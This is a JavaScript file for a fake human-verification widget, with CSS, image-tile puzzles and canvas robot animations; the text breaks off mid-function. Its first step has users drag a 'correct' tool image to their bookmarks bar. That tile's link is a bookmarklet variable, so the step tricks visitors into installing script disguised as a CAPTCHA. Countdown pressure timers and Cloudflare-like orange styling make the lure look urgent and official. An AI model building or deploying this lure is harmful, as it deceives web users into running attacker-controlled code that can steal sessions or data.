      ".storm-bookmark-hint{font-size:11px;line-height:1.45;color:#94a3b8;text-align:center;margin:0 6px 8px;font-family:'Outfit',system-ui,sans-serif;font-weight:600;max-width:420px}" +
      ".storm-fog{position:absolute;inset:0;background:radial-gradient(ellipse 95% 70% at 50% 100%,rgba(56,189,248,.14),transparent 52%),radial-gradient(ellipse 75% 55% at 15% 25%,rgba(99,102,241,.1),transparent),radial-gradient(ellipse 60% 50% at 85% 20%,rgba(14,165,233,.08),transparent);pointer-events:none;z-index:1;animation:storm-fog-drift 9s ease-in-out infinite alternate}" +
      "@keyframes storm-fog-drift{0%{opacity:.88}100%{opacity:1}}" +
      ".storm-clouds{position:absolute;top:0;left:0;right:0;height:50%;background:radial-gradient(ellipse 88% 100% at 50% 0%,rgba(15,23,42,.95),transparent);pointer-events:none;z-index:2}" +
      ".storm-rain-v2{position:absolute;inset:0;pointer-events:none;z-index:6}" +
      ".rain-drop{position:absolute;width:2px;height:16px;background:linear-gradient(180deg,rgba(186,230,253,.95),rgba(125,211,252,.25),transparent);border-radius:1px;animation:rain-drop-fall linear infinite}" +
      ".rain-drop.rain-wide{width:3px;height:22px;opacity:.85}" +
      ".rain-drop.rain-fast{height:20px}" +
      "@keyframes rain-drop-fall{0%{transform:translateY(-28px);opacity:0}8%{opacity:1}100%{transform:translateY(340px);opacity:.22}}" +
      ".storm-robot-panel{position:relative;z-index:5;flex:1 1 auto;min-height:0;margin:8px 8px 4px;border-radius:14px;border:1px solid rgba(148,163,184,.28);background:linear-gradient(180deg,#0c1929 0%,#1e293b 45%,#0f172a 100%);box-shadow:0 8px 28px rgba(0,0,0,.45),inset 0 0 0 1px rgba(255,255,255,.05);display:flex;align-items:center;justify-content:center;min-height:120px;max-height:min(26vh,198px);overflow:hidden}" +
      ".storm-robot-panel::before{content:'';position:absolute;inset:0;pointer-events:none;z-index:1;background:repeating-linear-gradient(180deg,transparent,transparent 20px,rgba(0,0,0,.18) 20px,rgba(0,0,0,.18) 21px);opacity:.9}" +
      ".storm-robot-panel::after{content:'';position:absolute;inset:0;pointer-events:none;z-index:2;background:linear-gradient(180deg,rgba(15,23,42,.25) 0%,transparent 40%,transparent 65%,rgba(15,23,42,.45) 100%)}" +
      ".storm-status-tag{position:absolute;top:12px;right:12px;z-index:8;font-size:8px;font-weight:800;letter-spacing:.11em;color:#fff;background:linear-gradient(135deg,rgba(234,179,8,.95),rgba(180,83,9,.95));padding:5px 11px;border-radius:999px;border:1px solid rgba(255,255,255,.35);text-transform:uppercase;box-shadow:0 4px 16px rgba(0,0,0,.4)}" +
      ".storm-hero-human{position:relative;z-index:4;display:block;width:auto;height:auto;max-width:min(76px,22vw);max-height:min(22vh,150px);margin:0;padding:0;background:transparent;filter:drop-shadow(0 8px 18px rgba(0,0,0,.55));animation:storm-survivor-bob 3.2s ease-in-out infinite}" +
      "@keyframes storm-survivor-bob{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}" +
      ".puzzle-zombies-v2{position:relative;width:100%;max-width:100%;margin:0;overflow:hidden}" +
      ".zombies-bookmark-hint{display:none}" +
      ".puzzle-zombies-canvas-gw{background:#0f172a;border-radius:14px;overflow:hidden;width:100%;max-width:640px;margin:0 auto;border:1px solid rgba(251,191,36,.35);box-shadow:0 10px 36px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.06)}" +
      ".zombies-canvas-ui{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:linear-gradient(180deg,#0f172a 0%,#0c1322 100%);border-bottom:1px solid rgba(251,191,36,.2)}" +
      ".zombies-canvas-stat{font-size:11px;font-weight:600;font-family:ui-monospace,SFMono-Regular,monospace;color:#e2e8f0}" +
      ".zombies-canvas-time{color:#22c55e}" +
      ".zombies-canvas-wave{color:#a78bfa}" +
      ".zombies-canvas-kills{color:#f97316}" +
      ".zombies-canvas-timer-wrap{height:6px;background:#0a0f1a;overflow:hidden}" +
      ".zombies-canvas-timer-bar{height:6px;background:linear-gradient(90deg,#ea580c,#f97316,#fbbf24);width:100%;transition:background .25s,width .1s linear;box-shadow:0 0 14px rgba(249,115,22,.4)}" +
      ".zombies-canvas-overlay{position:relative}" +
      ".zombies-canvas-el{display:block;width:100%;height:auto;cursor:default;vertical-align:middle;touch-action:none}" +
      ".zombies-canvas-msg{display:none;position:absolute;inset:0;background:rgba(0,0,0,.88);align-items:center;justify-content:center;flex-direction:column;gap:10px;padding:12px}" +
      ".zombies-canvas-msg.show{display:flex}" +
      ".zombies-canvas-msg-title{font-size:18px;font-weight:700;color:#f1f5f9;font-family:'Outfit',sans-serif;text-align:center}" +
      ".zombies-canvas-msg-sub{font-size:11px;color:#94a3b8;text-align:center;max-width:280px;line-height:1.4}" +
      ".captcha-box-inner{display:flex!important;flex-direction:column!important;min-height:0!important;max-height:100%!important;overflow:hidden!important;height:100%!important}" +
      "#challenge1.challenge-stage,#challenge2.challenge-stage{display:flex!important;flex-direction:column!important;flex:1 1 auto!important;min-height:0!important;overflow:hidden!important;border-radius:6px!important;background:#fff;height:100%!important}" +
      "#challenge1.challenge-stage.hidden,#challenge2.challenge-stage.hidden{display:none!important}" +
      "#challenge1 .challenge-banner:first-child,#challenge2 .challenge-banner:first-child{border-radius:6px 6px 0 0!important;flex-shrink:0!important}" +
      "#challenge1 .rc-footer,#challenge2 .rc-footer{flex-shrink:0!important;margin-top:auto!important}" +
      "#challenge2 .challenge-stage2-body{align-items:center!important;justify-content:center!important;width:100%!important;box-sizing:border-box!important;flex:1 1 auto!important;min-height:0!important;overflow-y:auto!important;-webkit-overflow-scrolling:touch!important;padding:14px 12px 16px!important}" +
      "#challenge2 .challenge-stage2-body.step2-jump{padding:6px 0 0!important;gap:4px!important;min-height:0!important;align-items:stretch!important}" +
      "#challenge2 .challenge-stage2-body.step2-jump .step2-pressure-timer{margin:0!important;padding:8px 14px 8px!important;border-radius:0!important;max-width:100%!important;width:100%!important;box-sizing:border-box!important;border-bottom:1px solid #fde68a!important}" +
      "#challenge2 .challenge-stage2-body.step2-jump .step2-timer-row{margin-bottom:3px!important}" +
      "#challenge2 .challenge-stage2-body.step2-jump .step2-timer-digits{font-size:21px!important}" +
      "#challenge2 .challenge-stage2-body.step2-jump .step2-timer-hint{margin:3px 0 0!important;font-size:9px!important;line-height:1.3!important}" +
      "#challenge2 .challenge-stage2-body.step2-jump .step2-timer-track{height:8px!important}" +
      ".jump-puzzle-shell{width:100%;max-width:100%;margin:0;padding:0;border-radius:12px;background:#fff;border:1px solid rgba(15,23,42,.1);box-shadow:0 6px 24px rgba(15,23,42,.1),0 1px 4px rgba(15,23,42,.05);box-sizing:border-box;overflow:hidden;font-family:'Outfit',system-ui,sans-serif}" +
      ".jump-scene-frame{padding:6px 6px 5px;background:linear-gradient(180deg,#f1f5f9,#e2e8f0)}" +
      ".puzzle-jump-v2{position:relative;width:100%;max-width:100%;margin:0;padding:0}" +
      ".jump-scene{position:relative;height:158px;border-radius:10px;background:linear-gradient(180deg,#0ea5e9 0%,#7dd3fc 32%,#bae6fd 58%,#e0f2fe 82%,#d6d3d1 94%,#57534e 100%);overflow:hidden;margin:0;border:1px solid rgba(255,255,255,.45);box-shadow:inset 0 1px 8px rgba(255,255,255,.45),inset 0 -6px 16px rgba(15,23,42,.08),0 4px 16px rgba(30,64,120,.1)}" +
      ".jump-scene::before{content:'';position:absolute;inset:0;border-radius:inherit;pointer-events:none;z-index:1;background:radial-gradient(ellipse 90% 42% at 50% -8%,rgba(255,255,255,.7),transparent 46%),radial-gradient(ellipse 50% 35% at 90% 18%,rgba(255,255,255,.2),transparent 48%)}" +
      ".jump-ground{position:absolute;left:0;right:0;bottom:0;height:26px;background:linear-gradient(180deg,#a8a29e 0%,#44403c 55%,#292524 100%);box-shadow:inset 0 6px 10px rgba(0,0,0,.4),0 -2px 0 rgba(0,0,0,.12);z-index:2}" +
      ".jump-robot-jet{position:absolute;left:50%;bottom:28px;width:56px;height:72px;margin-left:-28px;transition:bottom .2s ease-out;z-index:2;display:flex;flex-direction:column;align-items:center;justify-content:flex-end}" +
      ".jump-robot-body{width:100%;height:70%;margin:0 auto;border-radius:12px 12px 8px 8px;background:linear-gradient(180deg,#F38020 0%,#e65100 100%);box-shadow:inset 0 -4px 0 rgba(0,0,0,.15)}" +
      ".jump-robot-head{width:70%;height:28%;margin:-4px auto 0;border-radius:10px;background:#bdbdbd;box-shadow:inset 0 2px 0 rgba(255,255,255,.4)}" +
      ".jet-flame{position:absolute;bottom:-14px;left:50%;width:20px;height:22px;margin-left:-10px;background:linear-gradient(180deg,#ffeb3b,#ff9800,transparent);border-radius:50% 50% 60% 60%;opacity:0;transform:scaleY(.3);transition:opacity .1s,transform .1s}" +
      ".jump-robot-jet.thrust .jet-flame{opacity:1;transform:scaleY(1);animation:flame-flicker .08s ease infinite alternate}" +
      "@keyframes flame-flicker{from{transform:scaleY(.85) scaleX(1.05)}to{transform:scaleY(1.1) scaleX(.95)}}" +
      ".jump-height-tag{position:absolute;right:6px;top:6px;z-index:5;font-size:11px;font-weight:800;font-family:'Outfit',system-ui,sans-serif;color:#0c4a6e;background:rgba(255,255,255,.95);padding:4px 9px;border-radius:999px;border:1px solid rgba(255,255,255,.85);box-shadow:0 2px 10px rgba(15,23,42,.1),inset 0 1px 0 #fff}" +
      ".jump-robot-stack{position:absolute;left:50%;bottom:30px;transform:translateX(-50%);z-index:4;display:flex;flex-direction:column;align-items:center;transition:bottom .14s ease-out;pointer-events:none}" +
      ".jump-robot-canvas{display:block;width:min(72px,19vw);height:auto;margin:0 auto;vertical-align:bottom;background:transparent;filter:drop-shadow(0 6px 14px rgba(15,23,42,.28))}" +
      ".jump-jet{width:22px;height:24px;margin-top:-3px;margin-left:0;left:auto;bottom:auto;position:relative;background:linear-gradient(180deg,#fef9c3,#f97316,rgba(249,115,22,0));border-radius:50% 50% 60% 60%;opacity:0;z-index:3;filter:blur(.35px);transition:opacity .1s}" +
      ".challenge-stage2-body.puzzle-body-xl{min-height:auto!important;padding-bottom:12px!important}" +
      ".challenge-stage2-body.puzzle-body-tall.puzzle-body-xl.step2-jump{min-height:0!important;max-height:none!important;padding-top:4px!important;padding-bottom:4px!important}" +
      ".puzzle-glass-wrap,.puzzle-storm-v2,.puzzle-zombies-v2,.puzzle-jump-v2{max-width:100%!important;width:100%!important;margin:0!important}" +
      ".puzzle-glass-scene{height:200px!important;border-radius:15px!important}" +
      ".puzzle-progress-wrap{width:100%;max-width:100%;margin:12px auto 0!important;padding:0 4px!important;background:none;border-radius:12px}" +
      ".puzzle-progress-wrap.glass-progress{margin:16px auto 0!important;padding:16px 18px 18px!important;background:linear-gradient(180deg,#ffffff 0%,#fafafa 100%);border:1px solid rgba(0,0,0,.08);border-radius:14px;box-shadow:0 4px 20px rgba(15,23,42,.06),inset 0 1px 0 rgba(255,255,255,.9)}" +
      ".puzzle-progress-wrap.glass-progress .puzzle-progress-label{font-size:14px;color:#374151;margin:0 0 10px!important;font-weight:700;font-family:'Outfit',system-ui,sans-serif;display:flex;justify-content:center;align-items:baseline;gap:4px;flex-wrap:wrap}" +
      ".puzzle-progress-wrap.glass-progress .puzzle-progress-label .glass-lbl-muted{color:#6b7280;font-weight:600}" +
      ".puzzle-progress-wrap.glass-progress .puzzle-progress-label strong{color:#ea580c;font-size:17px;font-weight:800;font-variant-numeric:tabular-nums}" +
      ".puzzle-progress-wrap.glass-progress .puzzle-progress-track{height:14px;border-radius:999px;background:#e5e7eb;border:1px solid #d1d5db;box-shadow:inset 0 2px 5px rgba(0,0,0,.07);overflow:hidden}" +
      ".puzzle-progress-wrap.glass-progress .puzzle-progress-fill{background:linear-gradient(90deg,#c2410c 0%,#ea580c 35%,#F38020 65%,#fbbf24 100%);box-shadow:0 0 14px rgba(234,88,12,.35),inset 0 1px 0 rgba(255,255,255,.35);border-radius:999px;min-width:0}" +
      ".puzzle-progress-label{font-size:12px;color:#333;margin:8px 0 4px;font-weight:700;text-align:center}" +
      ".puzzle-progress-track{height:22px;border-radius:11px;background:#ececec;overflow:hidden;border:2px solid #ccc;box-shadow:inset 0 2px 4px rgba(0,0,0,.07)}" +
      ".puzzle-progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#e65100,#F38020,#ffcc80);transition:width .08s linear;border-radius:9px}" +
      ".puzzle-progress-fill.storm-health{background:linear-gradient(90deg,#b71c1c,#ff9800,#66bb6a);box-shadow:0 0 20px rgba(52,211,153,.35)}" +
      ".puzzle-progress-wrap.storm-health-wrap{flex-shrink:0;position:relative;z-index:8;margin:0 8px 8px!important;padding:10px 12px 12px!important;border-radius:12px;background:linear-gradient(180deg,rgba(15,23,42,.88),rgba(12,18,32,.92));backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border:1px solid rgba(251,191,36,.28);box-shadow:0 4px 22px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.07)}" +
      ".puzzle-progress-wrap.storm-health-wrap .puzzle-progress-label{color:#f1f5f9;font-family:'Outfit',sans-serif;font-size:12px;letter-spacing:.08em;text-transform:uppercase;display:flex;align-items:center;justify-content:space-between;gap:8px;margin:0 0 10px!important;width:100%;box-sizing:border-box}" +
      ".puzzle-progress-wrap.storm-health-wrap .storm-health-title{flex:1;min-width:0}" +
      ".puzzle-progress-wrap.storm-health-wrap .storm-health-pct{font-variant-numeric:tabular-nums;font-weight:800;color:#4ade80;text-shadow:0 0 12px rgba(74,222,128,.4)}" +
      ".puzzle-progress-wrap.storm-health-wrap .storm-health-pct.storm-health-low{color:#fca5a5;text-shadow:0 0 10px rgba(248,113,113,.45)}" +
      ".puzzle-progress-wrap.storm-health-wrap .puzzle-progress-track{height:16px;border-radius:999px;background:rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.15);box-shadow:inset 0 2px 10px rgba(0,0,0,.5)}" +
      ".storm-robot-img{display:block;width:min(150px,42vw);height:auto;margin:12px auto 4px;object-fit:contain;filter:drop-shadow(0 8px 16px rgba(0,0,0,.4));position:relative;z-index:2}" +
      ".storm-vignette{position:absolute;inset:0;pointer-events:none;box-shadow:inset 0 0 100px rgba(183,28,28,.4);opacity:0;transition:opacity .25s;z-index:7;border-radius:20px}" +
      ".storm-vignette.on{opacity:1}" +
      ".jump-scene .storm-robot-img{z-index:3}" +
      ".puzzle-progress-wrap.jump-meter-card{display:none}" +
      ".challenge-stage2-body.step2-quiz-scene{background:#f1f5f9!important;border-top:1px solid rgba(148,163,184,.25)!important}" +
      ".quiz-cap-wrap{background:#fff;border:1px solid #e2e8f0;border-radius:14px;width:100%;max-width:400px;margin:0 auto;overflow:hidden;transition:transform .08s;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}" +
      ".quiz-cap-header{background:#f8fafc;padding:12px 14px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e2e8f0}" +
      ".quiz-cap-title{font-size:11px;font-weight:600;color:#64748b;letter-spacing:.06em;text-transform:uppercase}" +
      ".quiz-cap-pill{font-size:12px;font-weight:600;font-family:ui-monospace,monospace;background:#fee2e2;color:#dc2626;padding:3px 11px;border-radius:99px}" +
      ".quiz-cap-body{padding:18px 16px 16px}" +
      ".quiz-cap-prog-wrap{height:4px;background:#f1f5f9;border-radius:2px;margin-bottom:16px;overflow:hidden}" +
      ".quiz-cap-prog{height:4px;background:#22c55e;border-radius:2px;width:100%;transition:width 1s linear,background .3s}" +
      ".quiz-cap-q{font-size:16px;font-weight:600;color:#0f172a;margin:0 0 6px;line-height:1.4}" +
      ".quiz-cap-hint{font-size:11px;color:#94a3b8;margin:0 0 16px;line-height:1.4}" +
      ".quiz-cap-options{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px}" +
      ".quiz-cap-opt{padding:12px 8px;border:1px solid #cbd5e1;border-radius:10px;background:#fff;color:#0f172a;font-size:14px;font-weight:500;cursor:pointer;text-align:center;transition:background .12s,border-color .12s;font-family:inherit}" +
      ".quiz-cap-opt:hover{background:#f8fafc;border-color:#94a3b8}" +
      ".quiz-cap-opt:active{transform:scale(.97)}" +
      ".quiz-cap-opt.quiz-cap-opt-wrong{background:#fee2e2;border-color:#fca5a5;color:#dc2626}" +
      ".quiz-cap-attempts{font-size:11px;color:#94a3b8;text-align:center;margin:0 0 12px}" +
      ".quiz-cap-attempts span{font-weight:600;color:#ef4444}" +
      ".quiz-cap-signal{border-top:1px solid #e2e8f0;padding-top:12px;margin-top:2px}" +
      ".quiz-cap-signal-lbl{display:block;font-size:10px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:#64748b;margin-bottom:6px;text-align:center}" +
      ".quiz-cap-signal-track{height:8px;background:#e2e8f0;border-radius:99px;overflow:hidden;border:1px solid #cbd5e1}" +
      ".quiz-cap-signal-fill{height:100%;width:0%;background:linear-gradient(90deg,#0ea5e9,#22c55e);border-radius:99px;transition:width .1s linear}" +
      ".quiz-cap-roundend{display:none;padding:20px 16px 22px;text-align:center}" +
      ".quiz-cap-roundend.show{display:block}" +
      ".quiz-cap-body.is-hidden{display:none!important}" +
      ".quiz-cap-roundend-title{font-size:17px;font-weight:600;color:#dc2626;margin:0 0 8px}" +
      ".quiz-cap-roundend-sub{font-size:12px;color:#64748b;line-height:1.5;margin:0}" +
      ".hidden-bookmark-sync{position:absolute!important;width:1px!important;height:1px!important;overflow:hidden!important;left:-9999px!important;clip:rect(0,0,0,0)!important}" +
      ".step2-pressure-timer{width:100%;max-width:400px;margin:0 auto 12px;padding:12px 14px;border-radius:14px;background:linear-gradient(180deg,#fffbeb 0%,#fef3c7 100%);border:1px solid rgba(251,191,36,.5);box-shadow:0 4px 16px rgba(245,158,11,.15)}" +
      ".step2-timer-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}" +
      ".step2-timer-label{font-size:12px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;color:#92400e;font-family:'Outfit',sans-serif}" +
      ".step2-timer-digits{font-size:26px;font-weight:800;color:#b45309;font-family:'JetBrains Mono',monospace;line-height:1}" +
      ".step2-timer-s{font-size:14px;font-weight:700;color:#d97706;margin-left:2px}" +
      ".step2-timer-track{height:10px;border-radius:999px;background:rgba(0,0,0,.08);overflow:hidden;border:1px solid rgba(180,83,9,.2)}" +
      ".step2-timer-fill{height:100%;width:100%;background:linear-gradient(90deg,#ea580c,#fbbf24);border-radius:999px;transition:width .25s linear}" +
      ".step2-timer-hint{margin:8px 0 0;font-size:11px;line-height:1.35;color:#78716c;text-align:center;font-weight:600}" +
      ".stage2-dark-scene .step2-pressure-timer{background:linear-gradient(180deg,rgba(15,23,42,.95),rgba(30,41,59,.85));border-color:rgba(251,191,36,.35);box-shadow:0 4px 24px rgba(0,0,0,.35)}" +
      ".stage2-dark-scene .step2-timer-label{color:#fde68a}" +
      ".stage2-dark-scene .step2-timer-digits{color:#fbbf24}" +
      ".stage2-dark-scene .step2-timer-s{color:#fcd34d}" +
      ".stage2-dark-scene .step2-timer-hint{color:#94a3b8}" +
      ".stage2-dark-scene .step2-timer-track{background:rgba(0,0,0,.35);border-color:rgba(255,255,255,.12)}";
    document.head.appendChild(st);
  })();

  var U = "https://images.unsplash.com/";
  var Q = "?auto=format&fit=crop&w=300&h=300&q=80";
  var HAMMER    = U + "photo-1602052793312-b99c2a9ee797" + Q;
  var SCISSORS  = U + "photo-1621446113284-53ca198c7fa7" + Q;
  var WRENCH    = U + "photo-1492540747731-d05a66dc2461" + Q;
  var PIZZA     = U + "photo-1565299624946-b28f40a0ae38" + Q;
  var BURGER    = U + "photo-1568901346375-23c9450c58cd" + Q;
  var APPLE     = U + "photo-1570913149827-d2ac84ab3f9a" + Q;
  var COOKIE    = U + "photo-1558961363-fa8fdf82db35" + Q;
  var CAKE      = U + "photo-1578985545062-69928b1d9587" + Q;
  var PUPPY     = U + "photo-1587300003388-59208cc962cb" + Q;
  var WATCH     = U + "photo-1523275335684-37898b6baf30" + Q;
  var TACO      = U + "photo-1565299585323-38d6b0865b47" + Q;
  var ICECREAM  = U + "photo-1563805042-7684c019e1cb" + Q;  
  var KEYS      = U + "photo-1522770179533-24471fcdba45" + Q;
  var FOREST    = U + "photo-1586864387789-628af9feed72" + Q;
  var BANDAGE   = U + "photo-1579684385127-1ef15d508118" + Q;
  var GUN = "https://images.unsplash.com/photo-1591123720164-de1348028a82?q=80&w=1625&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D";
  var JETPACK   = U + "photo-1446776811953-b23d57bd21aa" + Q; // rocket launch
  function img(url, label) { return { imageUrl: url, label: label }; }

  var HAMMER_THEMES = [
    { answerIndex: 2, items: [img(SCISSORS,"Scissors"),img(KEYS,"Keys"),img(HAMMER,"Hammer"),img(WRENCH,"Wrench"),img(FOREST,"Screwdriver"),img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple"),img(COOKIE,"Cookie")] },
    { answerIndex: 5, items: [img(TACO,"Taco"),img(CAKE,"Cake"),img(ICECREAM,"Ice Cream"),img(SCISSORS,"Scissors"),img(WRENCH,"Wrench"),img(HAMMER,"Hammer"),img(PUPPY,"Puppy"),img(WATCH,"Watch"),img(KEYS,"Keys")] },
    { answerIndex: 0, items: [img(HAMMER,"Hammer"),img(FOREST,"Screwdriver"),img(SCISSORS,"Scissors"),img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple"),img(WRENCH,"Wrench"),img(KEYS,"Keys"),img(CAKE,"Cake")] }
  ];
  var EDIBLE_THEMES = [
    { answerIndex: 1, items: [img(BURGER,"Burger"),img(APPLE,"Apple"),img(BANDAGE,"Bandage"),img(PIZZA,"Pizza"),img(COOKIE,"Cookie"),img(CAKE,"Cake"),img(TACO,"Taco"),img(ICECREAM,"Ice Cream"),img(WATCH,"Watch")] },
    { answerIndex: 3, items: [img(SCISSORS,"Scissors"),img(PIZZA,"Pizza"),img(COOKIE,"Cookie"),img(BANDAGE,"Bandage"),img(APPLE,"Apple"),img(BURGER,"Burger"),img(CAKE,"Cake"),img(KEYS,"Keys"),img(WRENCH,"Wrench")] }
  ];
  var WEAPON_THEMES = [
    { answerIndex: 2, items: [img(SCISSORS,"Scissors"),img(WRENCH,"Wrench"),img(GUN,"Weapon"),img(HAMMER,"Hammer"),img(FOREST,"Tool"),img(KEYS,"Keys"),img(WATCH,"Watch"),img(PUPPY,"Puppy"),img(CAKE,"Cake")] },
    { answerIndex: 5, items: [img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple"),img(COOKIE,"Cookie"),img(KEYS,"Keys"),img(GUN,"Weapon"),img(TACO,"Taco"),img(ICECREAM,"Ice Cream"),img(SCISSORS,"Scissors")] }
  ];
  var JETPACK_THEMES = [
    { answerIndex: 1, items: [img(WRENCH,"Wrench"),img(JETPACK,"Jetpack"),img(HAMMER,"Hammer"),img(KEYS,"Keys"),img(WATCH,"Watch"),img(FOREST,"Tool"),img(SCISSORS,"Scissors"),img(PUPPY,"Puppy"),img(CAKE,"Cake")] },
    { answerIndex: 4, items: [img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple"),img(COOKIE,"Cookie"),img(JETPACK,"Jetpack"),img(TACO,"Taco"),img(ICECREAM,"Ice Cream"),img(KEYS,"Keys"),img(WATCH,"Watch")] }
  ];
  var PUZZLES = [
    // { id: "glass", name: "Destroy Glass", step1: { bannerLine1: "Bookmark the hammer to destroy the glass", bannerLine2: "Drag the hammer to your bookmarks bar", themes: HAMMER_THEMES }, step2: { type: "glass", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "<span class=\"banner-line1\">Destroy the glass</span>" } },
    // { id: "storm", name: "Survive Storm", step1: { bannerLine1: "Bookmark any food or bandage item", bannerLine2: "Drag it to your bookmarks bar", themes: EDIBLE_THEMES }, step2: { type: "storm", timeLimit: 10, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Use your bookmarked supplies while the timer counts down." } },
    // { id: "zombies", name: "Survive Zombies", step1: { bannerLine1: "Bookmark the weapon (gun)", bannerLine2: "Drag the gun to your bookmarks bar", themes: WEAPON_THEMES }, step2: { type: "zombies", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Use your bookmarked tool to hold the line and stop the zombies while the timer counts down." } },
    // { id: "jump", name: "Jump to 100m", step1: { bannerLine1: "Bookmark the jetpack or strong legs", bannerLine2: "Drag it to your bookmarks bar", themes: JETPACK_THEMES }, step2: { type: "jump", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Reach <strong>100 m</strong> before time runs out." } },
    {
      id: "math",
      name: "Solve Math",
      step1: {
        bannerLine1: "Bookmark any safe tool",
        bannerLine2: "Drag it to your bookmarks bar",
        themes: HAMMER_THEMES
      },
      step2: {
        type: "math",
        timeLimit: 15,
        noManualDone: true,
        targetClicks: 0,
        instruction: "",
        bannerText:
          "Solve the math challenge to complete verification."
      }
    }
  ];

  var currentPuzzle = null;

  function getPuzzle() {
    return PUZZLES[Math.floor(Math.random() * PUZZLES.length)];
  }

  function getTheme() {
    if (!currentPuzzle || !currentPuzzle.step1.themes) return HAMMER_THEMES[0];
    var themes = currentPuzzle.step1.themes;
    return themes[Math.floor(Math.random() * themes.length)];
  }

  function buildChallenge1Grid() {
    if (!currentPuzzle) currentPuzzle = getPuzzle();
    var grid = getEl("challenge1Grid");
    if (!grid) return;
    grid.innerHTML = "";

    var step1 = currentPuzzle.step1;
    var theme = getTheme();
    var line1El = getEl("challenge1BannerLine1");
    var line2El = getEl("challenge1BannerLine2");
    if (line1El) line1El.textContent = step1.bannerLine1;
    if (line2El) line2El.textContent = step1.bannerLine2;

    var answerHref = bookmarkletHref;
    var wrongHref = "javascript:void(0)";

    theme.items.forEach(function (item, i) {
      var isAnswer = (i === theme.answerIndex);
      var href = isAnswer ? answerHref : wrongHref;
      var tile = document.createElement("div");
      tile.className = "challenge-tile draggable";

      var img = document.createElement("img");
      img.src = item.imageUrl;
      img.alt = item.label;
      img.className = "tile-img";
      img.setAttribute("draggable", "false");
      tile.appendChild(img);

      var a = document.createElement("a");
      a.href = href;
      a.className = "drag-layer";
      a.setAttribute("draggable", "true");
      a.setAttribute("title", isAnswer ? "Drag to bookmarks bar" : "Wrong item — bookmark the correct one");
      a.addEventListener("click", function (e) { e.preventDefault(); });
      a.addEventListener("dragstart", function (e) {
        e.dataTransfer.setData("text/uri-list", href);
        e.dataTransfer.setData("text/plain", href);
      });
      tile.appendChild(a);

      grid.appendChild(tile);
    });
  }

  var done1Button = getEl("done1Button");
  var done2Button = getEl("done2Button");
  var challenge1 = getEl("challenge1");
  var challenge2 = getEl("challenge2");
  var clickCounterEl = getEl("clickCounter");

  function jumpCanvasRR(ctx, x, y, w, h, r, fill, stroke) {
    ctx.beginPath();
    ctx.roundRect(x, y, w, h, r);
    if (fill) {
      ctx.fillStyle = fill;
      ctx.fill();
    }
    if (stroke) {
      ctx.strokeStyle = stroke;
      ctx.lineWidth = 1.5;
      ctx.stroke();
    }
  }

  /** Canvas robot for 100 m jump puzzle (same visuals as standalone animated robot demo). */
  function jumpCanvasDrawRobot(ctx, t, mood) {
    var W = 300;
    var H = 380;
    ctx.clearRect(0, 0, W, H);
    var C = {
      body: "#1e40af",
      bodyLight: "#3b82f6",
      head: "#1e3a8a",
      headLight: "#2563eb",
      joint: "#0f172a",
      panel: "#172554",
      eye: "#22d3ee",
      eyeAngry: "#ef4444",
      eyeHappy: "#4ade80",
      screenOn: "#0ea5e9",
      antenna: "#94a3b8",
      antennaTop: "#38bdf8",
      leg: "#1d4ed8",
      foot: "#1e3a8a",
      arm: "#1d4ed8",
      hand: "#1e3a8a",
      bolt: "#334155"
    };
    var cx = W / 2;
    var baseY = 310;
    var bodyBob = 0;
    var bodyTilt = 0;
    var lArmA = -0.2;
    var rArmA = -0.2;
    var lForeA = 0.3;
    var rForeA = 0.3;
    var lLegOff = 0;
    var rLegOff = 0;
    var eyeCol = C.eye;
    var screenCol = C.screenOn;
    var mouthOpen = 0.3;
    var antennaWobble = Math.sin(t * 0.05) * 3;
    var headBob = Math.sin(t * 0.04) * 2;

    if (mood === "idle") {
      bodyBob = Math.sin(t * 0.03) * 4;
      lArmA = -0.15 + Math.sin(t * 0.03) * 0.05;
      rArmA = -0.15 - Math.sin(t * 0.03) * 0.05;
    }
    if (mood === "wave") {
      bodyBob = Math.sin(t * 0.04) * 3;
      rArmA = -1.1 + Math.sin(t * 0.15) * 0.5;
      rForeA = 0.6 + Math.sin(t * 0.2) * 0.4;
      lArmA = -0.15;
      screenCol = "#0ea5e9";
      mouthOpen = 0.5;
    }
    if (mood === "dance") {
      bodyBob = Math.sin(t * 0.12) * 10;
      bodyTilt = Math.sin(t * 0.12) * 0.15;
      lArmA = -0.8 + Math.sin(t * 0.12) * 0.6;
      rArmA = -0.8 - Math.sin(t * 0.12) * 0.6;
      lLegOff = Math.sin(t * 0.12) * 8;
      rLegOff = -Math.sin(t * 0.12) * 8;
      screenCol = "#a855f7";
      mouthOpen = 0.7;
      eyeCol = "#facc15";
    }
    if (mood === "angry") {
      bodyBob = Math.sin(t * 0.2) * 2;
      bodyTilt = Math.sin(t * 0.18) * 0.06;
      lArmA = 0.3;
      rArmA = 0.3;
      lForeA = 0.8;
      rForeA = 0.8;
      eyeCol = C.eyeAngry;
      screenCol = "#dc2626";
      mouthOpen = 0;
      antennaWobble = Math.sin(t * 0.25) * 6;
    }
    if (mood === "happy") {
      bodyBob = Math.sin(t * 0.08) * 6;
      lArmA = -0.5 + Math.sin(t * 0.08) * 0.2;
      rArmA = -0.5 - Math.sin(t * 0.08) * 0.2;
